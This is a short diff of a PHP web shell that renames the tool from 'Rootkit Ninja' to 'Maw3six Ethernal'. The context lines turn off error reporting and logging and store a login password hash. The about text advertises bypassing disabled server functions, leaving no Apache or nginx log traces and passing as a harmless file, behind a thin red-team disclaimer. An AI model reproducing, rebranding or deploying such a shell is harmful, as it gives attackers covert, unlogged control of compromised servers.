@@ -6,7 +6,7 @@ error_reporting(0);
 @ini_set('log_errors','0');
 @clearstatcache();
 
-$s_title = "Rootkit Ninja";
+$s_title = "Maw3six Ethernal";
 $s_pass = "8ea5826700d709439efe49b8a6c3cb54";
 $s_color = "9d1920";
 $s_login_time = 3600 * 24 * 7;
@@ -2083,8 +2083,8 @@ if($s_auth){
 	
 	//tentang
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='about')){
-		$s_result .= "<div class='mybox'><h2>About of Rootkit Ninja</h2>
-        <p>Rootkit Ninja - One of a red team consists of security professionals who act as adversaries to overcome cyber security controls.</p>
+		$s_result .= "<div class='mybox'><h2>About of Maw3six Ethernal</h2>
+        <p>Maw3six Ethernal - One of a red team consists of security professionals who act as adversaries to overcome cyber security controls.</p>
         <p>We created this program for testing purposes only, that we can bypass all functions that have been disabled by the system administrator, there are no log traces on apache and nginx, and detected as harmless files by the system.</p>
 		<p>Usage of program without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.</p>
         <p>e: <a href='mailto:hello@rootkit-ninja.com'>hello@rootkit-ninja.com</a> | w: <a href='https://www.rootkit-ninja.com'>www.rootkit-ninja.com</a></p>
